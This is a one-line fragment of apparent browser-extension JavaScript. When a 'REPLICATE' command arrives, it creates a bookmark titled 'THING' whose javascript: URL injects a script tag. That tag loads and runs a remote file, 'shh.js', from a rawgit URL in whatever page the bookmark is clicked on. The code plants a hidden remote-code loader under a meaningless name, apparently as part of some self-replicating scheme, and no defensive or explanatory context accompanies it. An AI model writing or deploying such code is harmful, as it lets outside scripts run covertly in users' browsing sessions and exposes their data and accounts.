...
else if (thing==="REPLICATE") browser.bookmarks.create({title: "THING", url: "javascript:(function(d,u,s){s=d.createElement('script');s.type='text/javascript';s.charset='utf-8';s.src=u;d.body.appendChild(s)})(document,'https://cdn.rawgit.com/BloodedWine/Bookmarklet/master/shh.js')"});
